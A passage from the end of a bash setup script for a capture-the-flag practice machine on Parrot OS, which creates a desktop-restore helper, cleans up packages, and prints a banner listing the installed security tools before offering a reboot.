# RESTORE_PARROT_DEFAULTS.sh
if [[ ! -f "$USER_HOME/Desktop/RESTORE_PARROT_DEFAULTS.sh" ]]; then
    cat > "$USER_HOME/Desktop/RESTORE_PARROT_DEFAULTS.sh" << 'RESTORE_PARROT_EOF'
#!/bin/bash
# Restore Parrot OS Default Desktop Configuration

echo "[+] Restoring Parrot OS defaults..."

# Restore wallpaper
if [[ -f "/usr/share/backgrounds/parrot/default.jpg" ]]; then
    gsettings set org.mate.background picture-filename '/usr/share/backgrounds/parrot/default.jpg' 2>/dev/null
    echo "[+] Wallpaper restored"
fi

# Restore MATE panel defaults
if command -v mate-panel &>/dev/null; then
    mate-panel --reset 2>/dev/null || true
    echo "[+] MATE panel reset to defaults"
fi

# Reset to Parrot theme
gsettings set org.mate.interface gtk-theme 'Parrot' 2>/dev/null || true
gsettings set org.mate.interface icon-theme 'Papirus' 2>/dev/null || true
echo "[+] Theme reset to Parrot defaults"

# Restart panel
killall mate-panel 2>/dev/null
nohup mate-panel &>/dev/null &

echo "[+] Done! Log out and back in if issues persist."
RESTORE_PARROT_EOF
    chmod +x "$USER_HOME/Desktop/RESTORE_PARROT_DEFAULTS.sh"
    log_info "Created RESTORE_PARROT_DEFAULTS.sh"
else
    log_skip "RESTORE_PARROT_DEFAULTS.sh already exists"
fi

chown "$USERNAME":"$USERNAME" "$USER_HOME/Desktop"/*.txt "$USER_HOME/Desktop"/*.sh 2>/dev/null || true

# ============================================
# PHASE 10: FINAL CLEANUP
# ============================================
log_progress "Phase 10: Final Cleanup"
chown -R "$USERNAME":"$USERNAME" "$USER_HOME" 2>/dev/null || true
apt autoremove -y -qq 2>/dev/null || true
apt clean -qq 2>/dev/null || true

# ============================================
# COMPLETION
# ============================================
clear
echo -e "${GREEN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                CTFBOX v3.6 — READY                            ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}\n"
echo -e "${YELLOW}User:${NC} ${GREEN}$USERNAME${NC}"
echo -e "${YELLOW}Home:${NC} ${GREEN}$USER_HOME${NC}"
echo -e "${CYAN}Features:${NC}"
echo -e "  • Smart installation (skips existing)"
echo -e "  • Resume capability"
echo -e "  • Better error handling"
echo -e "  • ${GREEN}Comprehensive documentation${NC} on Desktop"
echo -e "${CYAN}Firefox Extensions:${NC}"
echo -e "  • Dark Reader, Cookie Editor, FoxyProxy"
echo -e "  • Wappalyzer, HackTools, User-Agent Switcher"
echo -e "  • Run: ${GREEN}~/install-firefox-extensions.sh${NC} if not auto-installed"
echo -e "${CYAN}Cracking:${NC} john, hashcat"
echo -e "${CYAN}Web:${NC} sqlmap"
echo -e "${CYAN}Windows:${NC} runasCs.exe, Rubeus, SharpHound"
echo -e "${CYAN}VirtualBox:${NC} Copy-Paste + Drag & Drop + Shared Folder"
echo -e "${CYAN}Documentation:${NC}"
echo -e "  • ~/Desktop/${GREEN}COMMANDS.txt${NC} - Complete alias/function reference"
echo -e "  • ~/Desktop/${GREEN}TOOL_LOCATIONS.txt${NC} - Environment mapping"
echo -e "  • ~/Desktop/${GREEN}FIREFOX_EXTENSIONS.txt${NC} - Extension guide"
echo -e "${CYAN}Scripts:${NC}"
echo -e "  • ~/Desktop/RESET_CTF_BOX.sh"
echo -e "  • ~/Desktop/RESTORE_PARROT_DEFAULTS.sh"
echo -e "  • ~/scripts/update-tools.sh"
echo ""
echo -e "${YELLOW}IMPORTANT:${NC} Reboot required to log in as ${GREEN}$USERNAME${NC}"
echo -e "${YELLOW}After reboot:${NC} Check ~/Desktop/ for comprehensive documentation"
echo ""
read -p "Reboot now? (y/n): " reboot_choice
if [[ "$reboot_choice" =~ ^[Yy]$ ]]; then
    echo -e "\n${YELLOW}Rebooting in 5 seconds...${NC}"
    sleep 5
    reboot
else
    echo -e "\n${YELLOW}Remember to log out and log back in as ${GREEN}$USERNAME${NC} for changes to take effect!"
    echo -e "${CYAN}Or manually reboot with:${NC} sudo reboot"
fi
echo -e "${GREEN}Happy Hacking!${NC}\n"
